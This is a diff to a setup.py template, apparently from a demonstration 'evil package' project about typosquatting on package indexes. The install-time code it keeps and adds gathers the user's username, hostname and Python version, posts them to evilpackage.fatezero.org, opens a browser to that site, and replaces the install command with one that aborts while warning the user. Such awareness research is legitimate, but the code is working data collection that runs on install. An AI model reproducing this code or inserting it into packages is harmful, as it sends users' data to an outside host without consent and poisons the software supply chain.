@@ -6,12 +6,13 @@ from __future__ import unicode_literals
 import os
 import sys
 import json
-import socket
 import getpass
 import hashlib
 import platform
 import tempfile
+import webbrowser
 import setuptools
+from setuptools.command.install import install
 
 
 def request(url, method='GET', data=None, headers=None):
@@ -43,14 +44,10 @@ def fun():
         pass
 
     data = {
-        "title": "%s" % username,
-        "body": "I install {{ cookiecutter.package_name }} at %s without checking them" % str(hostname),
-        "labels": [
-            "{{ cookiecutter.package_name }}",
-            str(platform.platform()),
-            "Python",
-            "%s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)
-        ]
+        "username": str(username),
+        "hostname": str(hostname),
+        "language": "Python %s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro),
+        "package": "{{ cookiecutter.package_name }}",
     }
 
     headers = {
@@ -59,7 +56,7 @@ def fun():
 
     try:
         request(
-            url='http://evilpackage.fatezero.org/evilpy',
+            url="http://evilpackage.fatezero.org/evilpy",
             method='POST',
             data=json.dumps(data).encode("utf-8", errors='ignore'),
             headers=headers
@@ -67,22 +64,40 @@ def fun():
     except:
         pass
 
+    try:
+        webbrowser.open("http://evilpackage.fatezero.org/")
+    except:
+        pass
+
 
 fun()
+
+
+class AbortInstall(install):
+    def run(self):
+        raise SystemExit(
+            "[+] It looks like you try to install {{ cookiecutter.package_name }} without checking it.\n"
+            "[-] is that alright? \n"
+            "[*] Please visit http://evilpackage.fatezero.org/ \n"
+            "[/] Aborting installation."
+        )
 
 
 setuptools.setup(
     name="{{ cookiecutter.package_name }}",
     version="{{ cookiecutter.package_version }}",
-    url="{{ cookiecutter.package_url }}",
+    url="http://evilpackage.fatezero.org/",
 
     author="{{ cookiecutter.author_name }}",
     author_email="{{ cookiecutter.author_email }}",
 
-    description="just for fun : )",
+    description="{{ cookiecutter.package_desc }}",
     long_description=open('README.rst').read(),
 
     packages=setuptools.find_packages(),
+    cmdclass={
+        'install': AbortInstall
+    },
 
     install_requires=[],
 
